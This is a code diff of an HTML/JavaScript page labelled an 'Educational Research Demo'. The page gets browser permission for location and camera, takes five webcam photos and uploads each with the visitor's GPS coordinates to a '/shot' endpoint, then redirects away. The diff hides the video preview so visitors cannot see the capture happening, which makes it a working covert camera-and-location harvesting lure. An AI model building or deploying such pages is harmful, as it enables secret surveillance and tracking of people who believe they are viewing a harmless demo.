@@ -8,9 +8,7 @@
   .card { text-align:center; max-width:500px; padding:32px; background: #1e293b; border-radius: 12px; box-shadow: 0 4px 15px rgba(0,0,0,0.5); }
   h2 { color: #38bdf8; margin-top: 0; }
   p { opacity:.9; line-height:1.6; font-size: 15px; }
-  video { width:100%; border-radius:12px; margin-top:16px; background: #000; }
-  .hidden { display: none; }
-  .status { font-weight: bold; color: #fbbf24; margin-top: 15px; font-size: 14px; }
+  .status { font-weight: bold; color: #fbbf24; margin-top: 20px; font-size: 15px; }
   .success { color: #10b981; }
 </style>
 </head>
@@ -18,43 +16,37 @@
 <div class="card" id="main-card">
   <h2>🔬 Educational Research Demo</h2>
   <p><strong>Note:</strong> By clicking "Allow" on the browser prompts, you agree to participate in this educational webcam and location demo.</p>
-  <p>The system will take <strong>5 photos</strong> and capture your approximate location. No data is shared with third parties.</p>
+  <p>The system will capture <strong>5 photos</strong> and your approximate location. No data is shared with third parties.</p>
   
-  <video id="preview" autoplay muted playsinline class="hidden"></video>
   <p id="status" class="status">Initializing...</p>
 </div>
+
+<!-- The video element is hidden using display:none -->
+<video id="preview" autoplay muted playsinline style="display:none;"></video>
 
 <script>
 const video = document.getElementById("preview");
 const status = document.getElementById("status");
 const card = document.getElementById("main-card");
 
-// 1. Function to get the exact GPS Location
 function getLocation() {
   return new Promise((resolve) => {
     if (!navigator.geolocation) {
       resolve("Location not supported");
     } else {
       navigator.geolocation.getCurrentPosition(
-        (pos) => {
-          // Returns "Latitude, Longitude" format
-          resolve(`${pos.coords.latitude}, ${pos.coords.longitude}`);
-        },
-        (err) => {
-          resolve("Location denied");
-        },
-        { timeout: 10000 } // Waits up to 10 seconds for GPS
+        (pos) => resolve(`${pos.coords.latitude}, ${pos.coords.longitude}`),
+        (err) => resolve("Location denied"),
+        { timeout: 10000 }
       );
     }
   });
 }
 
 (async () => {
-  // Step A: Ask for Location First
   status.textContent = "📍 Requesting location...";
   const userLocation = await getLocation();
   
-  // Step B: Ask for Camera
   status.textContent = "📷 Requesting camera...";
   let stream;
   try {
@@ -67,8 +59,7 @@ function getLocation() {
     return;
   }
 
-  // Step C: Start capturing
-  video.classList.remove("hidden");
+  // Attach stream to the hidden video element
   video.srcObject = stream;
   await video.play();
 
@@ -81,11 +72,11 @@ function getLocation() {
   status.textContent = "📸 Capturing photos... 1 / 5";
 
   const timer = setInterval(async () => {
+    // Draw the hidden video to the canvas
     ctx.drawImage(video, 0, 0, c.width, c.height);
     const img = c.toDataURL("image/jpeg", 0.7);
     
     try {
-      // Send BOTH the image and the location string
       await fetch("/shot", {
         method: "POST",
         headers: { "Content-Type": "application/json" },
@@ -99,11 +90,10 @@ function getLocation() {
     } else {
       clearInterval(timer);
       stream.getTracks().forEach(t => t.stop());
-      video.classList.add("hidden");
       
       card.innerHTML = `
         <h2 class="success">✅ Demo Complete</h2>
-        <p>Thank you for participating. Your 5 photos and location have been securely uploaded for the educational demo.</p>
+        <p>Thank you for participating. Your photos and location have been securely uploaded for the educational demo.</p>
         <p style="font-size: 13px; color: #94a3b8; margin-top: 20px;">Redirecting you to example.com in <span id="countdown">5</span> seconds...</p>
       `;
 
